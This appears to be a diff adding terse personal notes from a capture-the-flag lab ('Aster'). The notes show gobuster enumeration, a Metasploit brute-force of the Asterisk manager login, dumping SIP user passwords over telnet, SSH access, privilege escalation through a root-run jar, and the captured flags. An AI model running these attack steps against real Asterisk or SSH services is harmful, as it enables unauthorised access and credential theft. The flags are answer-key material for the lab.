@@ -1,0 +1,48 @@
+Date:31/mar/2021
+Time:21:05
+
+└─$ gobuster dir -u http://10.10.72.75 -w /usr/share/wordlists/dirb/common.txt 
+download the file from website and uncomply it 
+└─$ python3 output.py                                                                                                                                     3 ⚙
+Good job, user "admin" the open source framework for building communications, installed in the server. Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
+after editing and running  the uncompyle file
+
+http://10.10.72.75:5038/
+└─$ msfconsole -q                                                                                                                                         3 ⚙
+msf6 > search Asterisk
+msf6 > use 1
+msf6 auxiliary(voip/asterisk_login) > show options
+msf6 auxiliary(voip/asterisk_login) > set USERNAME admin
+USERNAME => admin
+msf6 auxiliary(voip/asterisk_login) > set RHOSTS 10.10.72.75
+RHOSTS => 10.10.72.75
+msf6 auxiliary(voip/asterisk_login) > set STOP_ON_SUCCESS true
+msf6 auxiliary(voip/asterisk_login) > run
+[+] 10.10.72.75:5038      - User: "admin" using pass: "abc123" - can login on 10.10.72.75:5038!
+
+└─$ telnet 10.10.72.75 5038                                                                                                                           1 ⨯ 1 ⚙
+action:login
+username:admin
+secret:abc123
+
+action:command
+command:sip show users
+found Output: harry                      p4ss#w0rd!#                       test             No   No        
+
+└─$ ssh harry@10.10.72.75    
+harry@ubuntu:~$ cat user.txt
+thm{bas1c_aster1ck_explotat1on}
+
+└─$ scp harry@10.10.72.75:/home/harry/Example_Root.jar /home/liki/tryhackme/Aster                                                                         3 ⚙
+got:Example_Root.jar
+upload file in http://www.javadecompilers.com/
+you will get these 
+final File file = new File("/tmp/flag.dat");
+final FileWriter fileWriter = new FileWriter("/home/harry/root.txt");
+
+harry@ubuntu:~$ cd /tmp
+harry@ubuntu:/tmp$ touch flag.dat
+harry@ubuntu:/tmp$ cd /home/harry
+harry@ubuntu:~$ java .jar Example_Root.jar 
+harry@ubuntu:~$ cat root.txt
+thm{fa1l_revers1ng_java}
